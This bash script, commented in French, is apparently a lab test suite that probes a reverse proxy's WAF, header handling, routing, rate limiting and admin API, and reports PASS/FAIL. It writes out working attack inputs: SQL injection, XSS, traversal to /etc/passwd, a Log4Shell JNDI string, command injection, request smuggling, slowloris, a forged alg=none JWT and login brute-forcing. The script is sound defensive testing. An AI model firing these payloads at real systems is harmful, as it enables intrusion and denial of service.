#!/usr/bin/env bash
# Batterie d'attaques ciblées avec verdict PASS/FAIL. Code retour = nombre d'échecs.
# Périmètre : le labo local uniquement (*.lab.test, Core du labo, Admin du labo).
set -u
. /lab/scripts/hosts.sh
CORE_HOST=${CORE_HOST:-goproxify-core}
ADMIN=${LAB_ADMIN_URL:-http://goproxify-admin:9443}
fail=0

ok()   { printf '  \033[32mPASS\033[0m %s\n' "$1"; }
ko()   { printf '  \033[31mFAIL\033[0m %s\n' "$1"; fail=$((fail+1)); }
code() { curl -s -o /dev/null -w '%{http_code}' --max-time 15 "$@"; }
expect_in() { # description got allowed...
  local d=$1 got=$2; shift 2
  for a in "$@"; do [ "$got" = "$a" ] && { ok "$d ($got)"; return; }; done
  ko "$d : obtenu $got, attendu $*"
}

# Garde-fou : après un redéploiement, lab-backend recompile son code et le Core répond 502 en attendant.
# Sans cela, tous les contrôles échouent pour une raison sans rapport avec la sécurité.
ready=0
for _ in $(seq 1 30); do
  [ "$(code http://lab-fast.lab.test/)" = 200 ] && { ready=1; break; }
  sleep 2
done
[ $ready = 1 ] || { echo "  FAIL route de référence lab-fast.lab.test indisponible après 60 s (lab-backend démarré ? seed fait ?) — arrêt"; exit 1; }

echo "== WAF (mode block) =="
B=http://lab-waf-block.lab.test
expect_in "SQLi ' OR 1=1"              "$(code "$B/?id=1%27%20OR%20%271%27%3D%271")"                403
expect_in "SQLi UNION SELECT"          "$(code "$B/?q=1%20UNION%20SELECT%20username,password%20FROM%20users")" 403
expect_in "XSS <script>"               "$(code "$B/?q=%3Cscript%3Ealert(1)%3C/script%3E")"       403
trav() { local out; out=$(curl -s -o /dev/null -w "%{http_code} %{redirect_url}" --max-time 15 --path-as-is "$1"); case "${out%% *}" in 301|308) case "$out" in *..*) echo "301-non-nettoye";; *) echo 400;; esac;; *) echo "${out%% *}";; esac; }
expect_in "Path traversal (rejet ou chemin nettoyé)" "$(trav "$B/../../../../etc/passwd")" 400 403 404
expect_in "Traversal encodé"           "$(code "$B/?f=..%2f..%2f..%2fetc%2fpasswd")"             403
expect_in "Log4Shell (User-Agent)"     "$(code -H 'User-Agent: ${jndi:ldap://x.test/a}' "$B/")"  403
expect_in "Injection commande"         "$(code "$B/?cmd=;cat%20/etc/passwd")"                    403
expect_in "Trafic légitime passe"      "$(code "$B/")"                                           200

echo "== WAF (mode detect : ne doit pas bloquer) =="
expect_in "SQLi tolérée en detect"     "$(code "http://lab-waf-detect.lab.test/?id=1%27%20OR%20%271%27%3D%271")" 200

echo "== Anti-usurpation d'IP / en-têtes =="
out=$(curl -s -H 'X-Forwarded-For: 6.6.6.6' -H 'X-Real-IP: 6.6.6.6' http://lab-fast.lab.test/echo)
last_xff=$(echo "$out" | jq -r '.headers["X-Forwarded-For"][0] // ""' | awk -F', *' '{print $NF}')
real=$(echo "$out" | jq -r '.headers["X-Real-Ip"][0] // ""')
# Ce runner est sur un réseau privé = proxy de confiance par défaut : X-Real-IP fourni peut légitimement être repris.
# On vérifie donc que le Core ajoute bien l'IP réelle du pair en fin de X-Forwarded-For.
[ "$last_xff" != "6.6.6.6" ] && ok "Core ajoute l'IP du pair en fin de XFF (xff=$last_xff)" || ko "XFF non complété par le Core (xff=$last_xff)"
echo "  info  X-Real-IP reçu par le backend : ${real:-<absent>} (attendu si le pair est un proxy de confiance)"
hop=$(curl -s -H 'Connection: X-Secret' -H 'X-Secret: 1' http://lab-fast.lab.test/echo | jq -r '.headers["X-Secret"] // empty')
[ -z "$hop" ] && ok "en-tête hop-by-hop (Connection:) retiré" || ko "hop-by-hop X-Secret transmis"

echo "== Routage / Host =="
expect_in "Host inconnu"               "$(code -H 'Host: inconnu.lab.test' "http://$CORE_HOST/")"  404 421 502 503
raw_status() { # requête brute (curl ne sait pas envoyer deux Host)
  exec 3<>"/dev/tcp/$CORE_HOST/80" || { echo 000; return; }
  printf '%b' "$1" >&3
  read -r -t 10 line <&3; exec 3>&-
  echo "$line" | awk '{print $2}'
}
expect_in "Host en double (requête brute)" "$(raw_status 'GET / HTTP/1.1\r\nHost: lab-fast.lab.test\r\nHost: evil.test\r\nConnection: close\r\n\r\n')" 400 404 421
expect_in "TRACE refusé"               "$(code -X TRACE http://lab-fast.lab.test/)"                400 403 405 501
expect_in "En-tête de 64 Ko"           "$(code -H "X-Big: $(head -c 65536 /dev/zero | tr '\0' a)" http://lab-fast.lab.test/)" 400 431 413
st=$(head -c 3000000 /dev/zero | curl -s --max-time 30 -o /tmp/up.out -w '%{http_code}' -X POST --data-binary @- "$B/upload")
if [ "$st" = 200 ] && [ "$(cat /tmp/up.out)" = 3000000 ]; then ok "corps 3 Mo (> max_body_mb=1) transmis intact au backend"
else ko "corps 3 Mo (> max_body_mb=1) : HTTP $st, backend a reçu '$(head -c 20 /tmp/up.out | tr -d '\n<')' sur 3000000 octets"; fi

echo "== Request smuggling (CL + TE) =="
resp=$(printf 'POST / HTTP/1.1\r\nHost: lab-fast.lab.test\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: lab-fast.lab.test\r\n\r\n' \
  | nc -w 5 "$CORE_HOST" 80 | grep -c '^HTTP/1.1 ')
[ "${resp:-0}" -le 1 ] && ok "un seul verdict HTTP pour une requête CL+TE ($resp)" || ko "$resp réponses : smuggling possible"

echo "== Rate limiting =="
n429=0
for _ in $(seq 1 120); do [ "$(code http://lab-ratelimit.lab.test/)" = 429 ] && n429=$((n429+1)); done
[ $n429 -gt 0 ] && ok "429 renvoyés en rafale ($n429/120)" || ko "aucun 429 sur 120 requêtes rapides (rps=10 burst=20)"

echo "== Robustesse connexions lentes (slowloris) =="
exec 3<>"/dev/tcp/$CORE_HOST/80"
printf 'GET / HTTP/1.1\r\nHost: lab-fast.lab.test\r\nX-Slow: ' >&3
start=$(date +%s)
read -r -t 45 -n1 <&3 || true   # rend la main dès que le serveur ferme (ou après 45 s)
dur=$(( $(date +%s) - start )); exec 3>&-
[ $dur -lt 40 ] && ok "connexion à en-têtes incomplets coupée après ${dur}s" || ko "connexion lente tenue ${dur}s (pas de read-header timeout)"

if [ "${LAB_SAFE:-0}" = 1 ]; then
  echo "== Admin API == (ignoré : LAB_SAFE=1)"
else
echo "== Admin API =="
expect_in "GET /proxies sans jeton"    "$(code "$ADMIN/api/v1/proxies")"                           401 403
expect_in "JWT forgé (alg=none)"       "$(code -H 'Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.' "$ADMIN/api/v1/proxies")" 401 403
expect_in "Traversal API (rejet ou chemin nettoyé)" "$(trav "$ADMIN/api/v1/../../etc/passwd")"  400 401 403 404
last=000
for i in $(seq 1 25); do
  last=$(code -X POST "$ADMIN/api/v1/auth/login" -H 'Content-Type: application/json' \
    -d "{\"email\":\"attacker@lab.test\",\"password\":\"bad$i\"}")
done
expect_in "Brute-force login : freinage (429/423 attendu après 25 essais)" "$last" 429 423
fi

echo
[ $fail -eq 0 ] && echo "Tous les contrôles sont passés." || echo "$fail contrôle(s) en échec."
exit $fail
